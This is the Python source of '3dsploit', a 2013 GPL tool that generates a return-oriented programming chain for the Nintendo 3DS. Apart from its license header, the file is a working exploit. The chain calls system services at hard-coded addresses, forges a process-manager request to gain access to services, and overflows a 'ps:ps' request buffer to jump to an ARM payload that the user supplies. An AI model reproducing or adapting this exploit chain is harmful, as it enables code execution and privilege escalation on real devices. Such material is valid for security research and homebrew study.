# 3dsploit.
# Copyright (C) 2013 naehrwert
# Copyright (C) 2013 oct0xor
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 2.0.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License 2.0 for more details.
# 
# A copy of the GPL 2.0 should have been included with the program.
# If not, see http://www.gnu.org/licenses/

import sys

from p3ds.util import *
from p3ds.ROP import *

def request(r, id, req, port):
	# Request setup.
	r.pop_r4(0x279020)
	r.i32(0x1C1958)
	r.i32(0x44444444)
	r.call_lr(0x10C2AC, [0x279024])
	r.mov_r4_r0()
	r.pop_r0(id)
	r.pop_r1_r5_r6(req, port, 0x66666666)
	# SendSyncRequest
	r.call(0x12A640, [], 3)

def main(argv):
	# Fill ARM payload here (pls size aligned to 4 bytes, base @ 0x080C3EE0):
	PAYLOAD = ""

	r = ROP(0x002B0000)

	# ConnectToPort(&port, "srv:pm");
	r.call_lr(0x1BEDC4, [Ref("port"), Ref("srv:pm")])

	# sub_10CBC0()
	r.call(0x105C88, [], 3)

	# GetProcessId(&proc, 0xFFFF8001);
	r.call_lr(0x129C34, [Ref("proc"), 0xFFFF8001])
	
	request(r, 0x04040040, Ref("proc"), Ref("port"))
	request(r, 0x04030082, Ref("proc"), Ref("port"))

	# sub_1B2130(&port, "ps:ps", 0x00000005)
	r.call(0x1B2134, [Ref("port"), Ref("ps:ps"), 0x00000005], 5)

	request(r, 0x20244, Ref("request"), Ref("port"))

	r.i32(0x19FB09)

	# Data.
	r.label("srv:pm")
	r.data("srv:pm\x00")
	r.label("ps:ps")
	r.data("ps:ps\x00")

	# Port.
	r.label("port")
	r.data("\x00" * 0x04)

	# Proc.
	r.label("proc")
	r.data(
	"\x00\x00\x00\x00\x18\x00\x00\x00\x02\x00\x18\x00")
	r.i32(Ref("wat?"))
	r.data("\x00" * 0x30)
	r.label("wat?")
	r.data(
	"\x41\x50\x54\x3A\x55\x00\x00\x00\x79\x32\x72\x3A\x75\x00\x00\x00"
	"\x67\x73\x70\x3A\x3A\x47\x70\x75\x6E\x64\x6D\x3A\x75\x00\x00\x00"
	"\x66\x73\x3A\x55\x53\x45\x52\x00\x68\x69\x64\x3A\x55\x53\x45\x52"
	"\x64\x73\x70\x3A\x3A\x44\x53\x50\x63\x66\x67\x3A\x75\x00\x00\x00"
	"\x66\x73\x3A\x52\x45\x47\x00\x00\x70\x73\x3A\x70\x73\x00\x00\x00"
	"\x6E\x73\x3A\x73\x00\x00\x00\x00\x61\x6D\x3A\x6E\x65\x74\x00\x00")
	r.data("\x00" * 0xA0)

	# Request.
	r.label("request")
	r.data("\x00" * 0x20)
	r.data("\x00\x00\x00\x00\x02\x00\x82\x00")
	r.i32(Ref("reqpart1"))
	r.data("\x0A\x44\x07\x00") # 0x7440 << 4 | 0xA
	r.i32(Ref("reqpart2"))
	r.data("\x00" * 0x4C)
	r.label("reqpart1")
	r.data("\x00" * 0x200)
	r.data("\x00\xA2\x03\x00")
	r.data("\x00" * 0xFC)
	r.label("reqpart2")
	# length = 0x7440, return addr = 0x080C3EE0
	r.data(PAYLOAD + struct.pack("<I", 0x080C3EE0) * (0x7440/4 - len(PAYLOAD)/4))

	rop = r.gen()

	#hexdump(rop, base=0x2B0000)

	with open(argv[0], "wb") as f:
		f.write(rop)

if __name__ == "__main__":
	main(sys.argv[1:])
